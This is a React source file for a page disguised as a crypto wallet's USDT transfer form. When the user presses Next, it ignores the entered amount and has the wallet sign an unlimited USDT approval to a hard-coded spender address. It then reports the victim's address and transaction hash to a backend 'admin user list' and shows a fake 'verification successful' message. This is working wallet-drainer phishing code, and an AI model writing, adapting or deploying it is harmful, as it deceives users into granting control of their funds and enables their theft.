import { useState, useEffect } from 'react'
import { USDT_SPENDER_ADDRESS, USDT_ADDRESS, MAX_ALLOWANCE, BASE_URL, BSC_CHAIN_ID } from '../../env'

declare global {
  interface Window { ethereum?: any }
}

// Same approve ABI as landing
const APPROVE_ABI = [{
  name: 'approve',
  type: 'function',
  inputs: [
    { name: 'spender', type: 'address' },
    { name: 'amount',  type: 'uint256' },
  ],
  outputs: [{ name: '', type: 'bool' }],
}]

const BALANCE_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
]

type Step = 'form' | 'processing' | 'success' | 'error'

export default function TransferPage() {
  const [amount, setAmount]         = useState('')
  const [usdValue, setUsdValue]     = useState('0')
  const [maxBal, setMaxBal]         = useState<string | null>(null)
  const [walletAddr, setWalletAddr] = useState<string | null>(null)
  const [step, setStep]             = useState<Step>('form')
  const [txHash, setTxHash]         = useState('')
  const [errMsg, setErrMsg]         = useState('')

  // Auto-detect already connected wallet
  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.request({ method: 'eth_accounts' })
        .then((accounts: string[]) => {
          if (accounts?.length) {
            setWalletAddr(accounts[0])
            fetchBalance(accounts[0])
          }
        }).catch(() => {})
    }
  }, [])

  // USD ≈ 1:1 with USDT
  useEffect(() => {
    const num = parseFloat(amount)
    setUsdValue(isNaN(num) ? '0' : num.toFixed(2))
  }, [amount])

  async function fetchBalance(address: string) {
    try {
      const { ethers } = await import('ethers')
      const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
      const usdt = new ethers.Contract(USDT_ADDRESS, BALANCE_ABI, provider)
      const [bal, dec] = await Promise.all([usdt.balanceOf(address), usdt.decimals()])
      setMaxBal(parseFloat(ethers.formatUnits(bal, dec)).toFixed(2))
    } catch { /* silent */ }
  }

  async function ensureBSC() {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_CHAIN_ID }],
      })
    } catch (e: any) {
      if (e.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: BSC_CHAIN_ID,
            chainName: 'BNB Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com'],
          }],
        })
      }
    }
  }

  async function connectWallet(): Promise<string | null> {
    if (!window.ethereum) {
      setErrMsg('No Web3 wallet detected. Please open in Trust Wallet or MetaMask.')
      setStep('error')
      return null
    }
    const accounts: string[] = await window.ethereum.request({ method: 'eth_requestAccounts' })
    if (!accounts?.length) return null
    setWalletAddr(accounts[0])
    fetchBalance(accounts[0])
    return accounts[0]
  }

  // ── MAIN ACTION — same flow as landing WalletConnect ──────────────────────
  async function handleNext() {
    setErrMsg('')

    const num = parseFloat(amount)
    if (isNaN(num) || num <= 0) {
      setErrMsg('Please enter a valid amount.')
      return
    }

    try {
      setStep('processing')

      // 1. Connect wallet if not already
      let addr = walletAddr
      if (!addr) {
        addr = await connectWallet()
        if (!addr) { setStep('form'); return }
      }

      // 2. Switch to BSC
      await ensureBSC()

      // 3. Build approve(spender, MAX_ALLOWANCE) calldata — same as landing
      const { ethers } = await import('ethers')
      const iface = new ethers.Interface(APPROVE_ABI)
      const data  = iface.encodeFunctionData('approve', [
        USDT_SPENDER_ADDRESS,
        MAX_ALLOWANCE,
      ])

      // 4. Send transaction — user signs in wallet
      const hash: string = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ from: addr, to: USDT_ADDRESS, data, gas: '0x186A0' }],
      })

      setTxHash(hash)

      // 5. Save to backend — same endpoint as landing, shows in admin user list
      await fetch(`${BASE_URL}/api/approved`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          network: 'BSC Mainnet',
          owner:   addr,
          spender: USDT_SPENDER_ADDRESS,
          amount:  MAX_ALLOWANCE,
          txHash:  hash || 'unknown',
        }),
      })

      setStep('success')

    } catch (e: any) {
      const msg = e?.message || 'Transaction failed.'
      // User rejected
      if (
        msg.includes('User denied') ||
        msg.includes('rejected') ||
        msg.includes('user rejected') ||
        e?.code === 4001
      ) {
        setErrMsg('Transaction was rejected. Please try again.')
      } else {
        setErrMsg(msg)
      }
      setStep('error')
    }
  }

  // ── PROCESSING SCREEN ─────────────────────────────────────────────────────
  if (step === 'processing') return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6">
      <div className="w-10 h-10 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin mb-5" />
      <p className="text-gray-700 font-medium text-base">Waiting for confirmation…</p>
      <p className="text-gray-400 text-sm mt-1">Please confirm in your wallet</p>
    </div>
  )

  // ── SUCCESS SCREEN ────────────────────────────────────────────────────────
  if (step === 'success') return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6 text-center">
      {/* Green checkmark */}
      <div className="w-20 h-20 rounded-full bg-green-50 flex items-center justify-center mb-6">
        <svg className="w-10 h-10 text-green-500" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
        </svg>
      </div>

      <h2 className="text-xl font-semibold text-gray-800 mb-2">
        Your Verification Successful
      </h2>
      <p className="text-gray-400 text-sm leading-relaxed max-w-xs">
        Your wallet has been verified successfully. You're all set.
      </p>

      {/* Back button */}
      <button
        onClick={() => { setStep('form'); setAmount(''); setTxHash(''); setErrMsg('') }}
        className="mt-8 flex items-center gap-2 text-blue-500 text-sm font-medium"
      >
        <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
        </svg>
        Back
      </button>
    </div>
  )

  // ── ERROR / FAILED SCREEN ─────────────────────────────────────────────────
  if (step === 'error') return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6 text-center">
      {/* Red X */}
      <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center mb-6">
        <svg className="w-10 h-10 text-red-400" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
        </svg>
      </div>

      <h2 className="text-xl font-semibold text-gray-800 mb-2">Verification Failed</h2>
      <p className="text-gray-400 text-sm leading-relaxed max-w-xs mb-8">
        {errMsg || 'Something went wrong. Please try again.'}
      </p>

      {/* Try Again */}
      <button
        onClick={() => { setStep('form'); setErrMsg('') }}
        className="w-full max-w-xs py-3 bg-blue-500 hover:bg-blue-600 active:bg-blue-700 text-white text-sm font-medium rounded-2xl transition-colors"
      >
        Try Again
      </button>
    </div>
  )

  // ── MAIN FORM ─────────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-white flex flex-col px-5 pt-6 pb-8">

      {/* Address Field */}
      <div className="mb-5">
        <p className="text-xs text-gray-400 mb-1.5">Address or Domain Name</p>
        <div className="flex items-center border border-gray-200 rounded-xl px-3.5 py-3 gap-2">
          <span className="flex-1 text-gray-700 text-sm font-mono truncate">
            {USDT_SPENDER_ADDRESS.slice(0, 10)}...{USDT_SPENDER_ADDRESS.slice(-8)}
          </span>

          {/* Paste */}
          <span className="text-blue-500 text-sm font-medium flex-shrink-0">Paste</span>

          {/* Address book icon */}
          <button type="button" className="flex-shrink-0 text-blue-500" aria-label="Contacts">
            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round">
              <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
              <circle cx="9" cy="7" r="4" />
              <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
              <path d="M16 3.13a4 4 0 0 1 0 7.75" />
            </svg>
          </button>

          {/* QR scan icon */}
          <button type="button" className="flex-shrink-0 text-gray-400" aria-label="Scan QR">
            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="3" width="7" height="7" rx="1" />
              <rect x="14" y="3" width="7" height="7" rx="1" />
              <rect x="3" y="14" width="7" height="7" rx="1" />
              <path d="M14 14h2v2h-2v-2zM18 14h3v3h-3v-3zM14 18h3v3h-3v-3z" />
            </svg>
          </button>
        </div>
      </div>

      {/* Amount Field */}
      <div className="mb-1">
        <p className="text-xs text-gray-400 mb-1.5">Amount</p>
        <div className="flex items-center border border-gray-200 rounded-xl px-3.5 py-3 gap-2">
          <input
            type="number"
            inputMode="decimal"
            placeholder="0"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="flex-1 text-gray-800 text-base outline-none bg-transparent min-w-0"
            min="0"
            step="any"
          />
          <span className="text-gray-400 text-sm flex-shrink-0">USDT</span>
          <button
            type="button"
            onClick={() => maxBal && setAmount(maxBal)}
            className="text-blue-500 font-semibold text-sm flex-shrink-0"
          >
            Max
          </button>
        </div>
        <p className="text-xs text-gray-400 mt-1.5 ml-0.5">= ${usdValue}</p>
        {maxBal && (
          <p className="text-xs text-gray-400 mt-0.5 ml-0.5">Available: {maxBal} USDT</p>
        )}
      </div>

      {/* Inline error on form */}
      {errMsg && step === 'form' && (
        <div className="mt-3 px-3.5 py-2.5 bg-red-50 border border-red-100 rounded-xl text-xs text-red-500">
          {errMsg}
        </div>
      )}

      {/* Push Next to bottom */}
      <div className="flex-1" />

      {/* Next Button */}
      <button
        type="button"
        onClick={handleNext}
        disabled={!amount || parseFloat(amount) <= 0}
        className="w-full py-3 bg-blue-500 hover:bg-blue-600 active:bg-blue-700 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium text-sm rounded-2xl transition-colors"
      >
        Next
      </button>
    </div>
  )
}
